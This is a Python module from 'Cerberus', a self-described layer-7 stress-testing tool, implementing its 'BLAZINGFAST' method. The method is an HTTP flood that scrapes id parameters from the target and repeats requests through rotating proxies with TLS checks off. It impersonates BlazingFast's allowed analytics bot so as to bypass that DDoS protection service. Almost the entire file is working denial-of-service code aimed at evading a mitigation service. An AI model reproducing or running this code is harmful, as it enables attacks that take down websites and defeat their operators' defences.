'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

import time, requests, re

from src.core import Core
from src.utils import *
from src.useragent import *

def flood(attack_id, url, stoptime) -> None:

    ids = []
    if not Core.blazingfast_ids_grabbed:
        try:
            ids = [_id for _id in re.findall(r'([\.\\][a-z]+&?id=[1-4])',requests.get(url, headers=utils().buildheaders(url)).text)]
            Core.blazingfast_ids_grabbed = True
        except Exception:
            pass

    if ids == []: ids = ['1','2','3','4']

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue

        headers = utils().buildheaders(url)
        headers['User-Agent'] = 'BOT:/BlazingFastAnalytics'
        
        try:
            _id = choice(ids)
            req = Core.session.get(
                f'{url}?id_client={_id}', 
                headers=headers,
                json={"captcha": True, "auth": _id},
                verify=False, 
                timeout=(5,0.1), 
                allow_redirects=False,
                stream=False,
                cert=None,
                proxies=utils().get_proxy()
            )

            if req.status_code == 204:
                Core.infodict[attack_id]['req_sent'] += 1

        except requests.exceptions.ReadTimeout:
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'BLAZINGFAST': {
        'info': 'Blazingfast bypass, impersonates the analytics bot which is allowed by default. Credits to 0x44F and mSQL',
        'func': flood
    }
})